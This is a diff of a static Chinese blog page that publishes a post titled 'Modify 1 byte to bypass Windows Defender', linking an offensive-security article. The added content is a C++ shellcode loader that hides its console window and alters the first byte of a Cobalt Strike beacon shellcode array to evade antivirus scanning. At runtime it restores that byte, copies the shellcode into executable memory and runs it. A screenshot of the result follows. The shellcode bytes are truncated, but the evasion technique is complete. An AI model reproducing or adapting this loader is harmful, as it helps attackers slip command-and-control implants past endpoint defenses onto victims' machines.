@@ -834,7 +834,7 @@
           <i class="far fa-calendar-check"></i>
         </span>
         <span class="post-meta-item-text">更新于</span>
-        <time title="修改时间：2020-12-12 20:24:50" itemprop="dateModified" datetime="2020-12-12T20:24:50+08:00">2020-12-12</time>
+        <time title="修改时间：2020-12-18 13:41:24" itemprop="dateModified" datetime="2020-12-18T13:41:24+08:00">2020-12-18</time>
       </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -860,15 +860,11 @@
     
     
     <div class="post-body" itemprop="articleBody">
-          Here's something encrypted, password is required to continue reading.
-          <!--noindex-->
-            <div class="post-button">
-              <a class="btn" href="/posts/b6184c34/#more" rel="contents">
-                阅读全文 &raquo;
-              </a>
-            </div>
-          <!--/noindex-->
-        
+          <h2 id="修改1字节绕过Windows-Defender"><a href="#修改1字节绕过Windows-Defender" class="headerlink" title="修改1字节绕过Windows Defender"></a>修改1字节绕过Windows Defender</h2><p><a target="_blank" rel="noopener" href="https://www.ired.team/offensive-security/defense-evasion/evading-windows-defender-using-classic-c-shellcode-launcher-with-1-byte-change">https://www.ired.team/offensive-security/defense-evasion/evading-windows-defender-using-classic-c-shellcode-launcher-with-1-byte-change</a></p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;stdafx.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;Windows.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span> </span>&#123;</span><br><span class="line">    ::ShowWindow(::GetConsoleWindow(), SW_HIDE);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// cobalt strike beacon shellcode x64</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> shellcode[] = <span class="string">&quot;\xfd\x48\...&quot;</span>;</span><br><span class="line">    <span class="keyword">char</span> first[] = <span class="string">&quot;\xfc&quot;</span>;</span><br><span class="line">    <span class="keyword">void</span> *exec = VirtualAlloc(<span class="number">0</span>, <span class="keyword">sizeof</span> shellcode, MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memcpy</span>(shellcode, first, <span class="number">1</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(exec, shellcode, <span class="keyword">sizeof</span> shellcode);</span><br><span class="line">    ((<span class="keyword">void</span>(*)())exec)();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="效果"><a href="#效果" class="headerlink" title="效果"></a>效果</h2><p><img src="/posts/b6184c34/res/2020-12-04-19-49-58.png" alt="1"></p>
+
       
     </div>
 
